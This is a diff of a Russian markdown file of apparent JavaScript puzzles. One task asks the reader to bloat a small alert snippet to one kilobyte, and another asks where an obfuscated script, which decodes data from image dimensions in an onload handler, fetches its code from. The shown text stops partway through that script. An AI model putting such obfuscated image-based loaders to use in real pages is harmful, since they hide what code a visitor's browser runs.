@@ -2,13 +2,15 @@
 
 
 # 1) задание первое:
-        раздуть код 
-                name='foo';alert(window.name);
-        до одного килобайта.
+раздуть код 
+```
+name='foo';alert(window.name);
+```
+до одного килобайта.
 
 # 2) задание второе:
         Объяснить, с какого адреса данный код
-        ```
+        ```javascript
               <script type="text/javascript" id="73901220182">
                 (function(d,c,b,a,e){
                     with(new Image)onload=function(){with(this)a.push((1E6+1E3*width+1*height+a).slice(-6).replace(/\d{2}/g,
